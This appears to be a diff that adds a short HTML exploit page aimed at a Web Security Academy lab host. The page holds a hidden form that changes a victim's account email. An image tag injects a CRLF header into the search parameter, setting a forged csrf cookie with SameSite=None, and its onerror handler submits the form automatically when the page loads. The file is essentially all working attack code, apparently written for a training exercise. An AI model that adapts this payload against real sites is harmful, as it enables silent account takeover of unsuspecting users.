@@ -1,0 +1,10 @@
+<html>
+    <body>
+        <h1>Hello World!</h1>
+        <form action="https://0a1e006d0418898d847eb39a00e200f7.web-security-academy.net/my-account/change-email" method="post">
+            <input type="hidden" name="email" value="hello@hello.com">
+            <input type="hidden" name="csrf" value="hello">
+        </form>
+        <img src="https://0a1e006d0418898d847eb39a00e200f7.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrf=hello%3b%20SameSite=None" onerror="document.forms[0].submit()">
+    </body>
+</html>
